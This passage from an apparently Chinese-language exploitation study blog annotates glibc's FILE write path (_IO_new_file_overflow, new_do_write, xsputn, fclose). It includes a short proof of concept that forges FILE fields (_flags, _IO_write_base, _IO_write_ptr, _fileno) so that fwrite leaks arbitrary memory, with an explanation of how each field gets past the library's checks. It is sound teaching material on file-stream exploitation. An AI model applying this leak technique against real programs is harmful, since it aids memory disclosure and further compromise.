<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)				<span class="comment">//if (_IO_OVERFLOW (f, EOF) == EOF)</span></span><br><span class="line">&#123;<span class="comment">//ch是结束字符,如果是EOF则不附加在末尾,否则比如&#x27;\n&#x27;会附加在末尾</span></span><br><span class="line">    <span class="comment">//如果打开标志是&quot;r&quot;,也就是只读,那么会在_IO_new_file_fopen中设置_IO_NO_WRITES标志,表明只读打开</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span><span class="comment">//overflow的作用是将缓冲区写入文件,显然对于只读文件不能写</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="comment">//如果文件流f当前不不不处于往文件写入的状态, 或者文件流f没有write_buf</span></span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)	<span class="comment">//对于没有write_buf的情况则给f分配一个</span></span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);			<span class="comment">//申请一个0x1000字节的write_buf给f</span></span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);	<span class="comment">//设置write_buf和buf相同</span></span><br><span class="line">	&#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))	</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      	<span class="comment">//初始化指针</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">			f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//这里实际上是f-&gt;_IO_write_ptr = f-&gt;_IO_buf_base 但是实际上f-&gt;_IO_read_ptr也是这个值,因此无所谓了</span></span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">		<span class="comment">//标记正在往文件写入</span></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)			<span class="comment">//如果ch为EOF则将目前的缓冲区先写入文件然后就返回了</span></span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//_IO_do_write会复位缓冲区</span></span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">//如果writebuf满了</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)	<span class="comment">//也是先把目前缓冲区写入文件,实际上调用的是_IO_do_write,也会复位缓冲区 </span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;			<span class="comment">//最后补上一个ch字符</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)	<span class="comment">//如果不缓冲或者行缓冲并且有\n</span></span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,<span class="comment">//缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)<span class="comment">//如果最后剩下的块比当时的缓冲区大,还是会造成文件io的</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span>			<span class="comment">//count = new_do_write (f, s, do_write);</span></span><br><span class="line">&#123;	</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);	<span class="comment">//调整文件指针</span></span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);		<span class="comment">//实际写,count是实际写入的字节数</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<span class="comment">//read_buf缓冲区参照buf复位</span></span><br><span class="line">    </span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;	<span class="comment">//write_buf复位</span></span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_default_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">	&#123;<span class="comment">//如果缓冲区有空</span></span><br><span class="line">	  <span class="type">size_t</span> count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">	  <span class="keyword">if</span> (count &gt; more)<span class="comment">//如果缓冲区空地够大</span></span><br><span class="line">	    count = more;</span><br><span class="line">          <span class="comment">//到这里时,count&lt;=more</span></span><br><span class="line">	  <span class="keyword">if</span> (count &gt; <span class="number">20</span>)<span class="comment">//要么mempcpy实现拷贝,要么循环实现</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">	      s += count;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">	      <span class="type">ssize_t</span> i;</span><br><span class="line">	      <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">		*p++ = *s++;</span><br><span class="line">	      f-&gt;_IO_write_ptr = p;</span><br><span class="line">	    &#125;</span><br><span class="line">	  more -= count;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">          <span class="comment">//如果more=0则不会执行后句,此时最后的剩余块也放到了缓冲区,不需要腾空了</span></span><br><span class="line">          <span class="comment">//否则more&gt;0表明还有剩下的,但是缓冲区此时满了,需要缓冲区写入文件,然后缓冲区复位</span></span><br><span class="line">          <span class="comment">//然后重新把剩下的放到缓冲区中</span></span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *f</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _flags = <span class="number">2048</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x404038</span> &lt;flag&gt; <span class="string">&quot;flag&#123;secret&#125;&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x405038</span> &lt;error: Cannot access memory at address <span class="number">0x405038</span>&gt;,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">1</span>,</span><br><span class="line">  _flags2 = <span class="number">0</span>,</span><br><span class="line">  _old_offset = <span class="number">0</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x1458790</span>,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x14587a0</span>,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flose(_IO_new_fclose@glibc-2.23/libio/iofclose.c:38)</span><br><span class="line">	-&gt;_IO_un_link@glibc-2.23/libio/genops.c:58</span><br><span class="line">		//从_IO_list_all为首的单向链表上遍历找到并拆下这个_IO_FILE_plus,</span><br><span class="line">	-&gt;_IO_file_close_it@glibc-2.23/libio/fileops.c:157</span><br><span class="line">		-&gt;_IO_do_flush			//缓冲区还有东西没打印出来,都给打出来</span><br><span class="line">			-&gt;_IO_do_write</span><br><span class="line">				-&gt;new_do_write</span><br><span class="line">					-&gt;vtable.__write</span><br><span class="line">						-&gt;write(linux api)</span><br><span class="line">						</span><br><span class="line">		-&gt;_IO_un_link	//这一次重复调用好像是多余的,可能防止之前有什么差错?</span><br><span class="line">	-&gt;vtable.__finish(_IO_new_file_finish)</span><br><span class="line">		-&gt;_IO_do_flush	//第二次调用</span><br><span class="line">			...</span><br><span class="line">		-&gt;__close</span><br><span class="line">			-&gt;_IO_file_close_it	//第二次调用</span><br><span class="line">		-&gt;_IO_default_finish</span><br><span class="line">			-&gt;free	//释放对上占用的内存</span><br><span class="line">			-&gt;_IO_un_link	//第三次调用</span><br></pre></td></tr></table></figure>



<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h3><p>篡改fp的写缓冲区指针指向需要泄露的地址, 并篡改fp的文件描述符为标准输出, 触发一个缓冲区刷新, 即可打印泄露</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>

<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
</blockquote>
<p>写一个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;this is a secret&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);		<span class="comment">// unset _IO_NO_WRITES to bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span>; 			<span class="comment">//IO_CURRENTLY_PUTTING bypass checks in _IO_file_overflow</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;	<span class="comment">//points to address that we want to leak</span></span><br><span class="line">    fp-&gt;_IO_read_end = secret;      <span class="comment">//IO_read_end must equals to write_base to bypass checks in new_do_write</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);	<span class="comment">//ptr - base contains our flag to leak</span></span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;               	<span class="comment">//redirect to stdout</span></span><br><span class="line"></span><br><span class="line">    fwrite(buffer,<span class="number">0x100</span>,<span class="number">0x1</span>,fp);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_write_base = secret;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fwrite</span><br><span class="line">	_IO_sputn =&gt; _IO_file_xsputn</span><br><span class="line">		_IO_OVERFLOW =&gt; _IO_file_overflow</span><br><span class="line">			=&gt; _IO_new_do_write</span><br><span class="line">				=&gt; new_do_write</span><br><span class="line">					=&gt; _IO_file_write</span><br><span class="line">						=&gt; __write</span><br></pre></td></tr></table></figure>

<p>从而打印<code>secret</code>上的字符串</p>
<p>为了实现这一目的,还需要设置<code>FILE</code>的几个参数</p>
<h4 id="1-fp-fopen-flag-w"><a href="#1-fp-fopen-flag-w" class="headerlink" title="-1.fp = fopen(&quot;./flag&quot;, &quot;w&quot;);	"></a>-1.<code>fp = fopen(&quot;./flag&quot;, &quot;w&quot;);	</code></h4><p>这个<code>fp</code>要么以<code>w</code>打开,要么手动设置其<code>flag |= ~0x8</code></p>
<p>总之不能有<code>_IO_NO_WRITES</code>, 这是因为<code>_IO_file_overflow</code>最开始会检查该标志, 防止对不可写的文件进行写入操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<h4 id="0-fp-IO-write-base-secret"><a href="#0-fp-IO-write-base-secret" class="headerlink" title="0.fp-&gt;_IO_write_base = secret;"></a>0.<code>fp-&gt;_IO_write_base = secret;</code></h4><p>最关键的一条,要泄露的地址</p>
<h4 id="1-fp-IO-write-ptr-secret-sizeof-secret"><a href="#1-fp-IO-write-ptr-secret-sizeof-secret" class="headerlink" title="1.fp-&gt;_IO_write_ptr = secret + sizeof(secret);"></a>1.<code>fp-&gt;_IO_write_ptr = secret + sizeof(secret);</code></h4><p>与0紧密配合,<code>_IO_OVERFLOW</code>会将位于<code>write_base</code>和<code>write_ptr</code>之间的内容刷新到缓冲区</p>
<p>要保证两者之间的距离大于flag长度</p>
<h4 id="3-fp-flags-0x800"><a href="#3-fp-flags-0x800" class="headerlink" title="3.fp-&gt;_flags = 0x800;"></a>3.<code>fp-&gt;_flags = 0x800;</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = 0x800; //IO_CURRENTLY_PUTTING</span><br></pre></td></tr></table></figure>

<p>这里是因为在函数<code>_IO_file_overflow</code>中,如果不设置该标志会进入一个条件分支,修改我们预设的<code>_IO_write_base </code>等一系列指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_IO_new_file_overflow</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">   If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">   logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">   read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">   makes room for subsequent output.</span></span><br><span class="line"><span class="comment">   Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">   alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

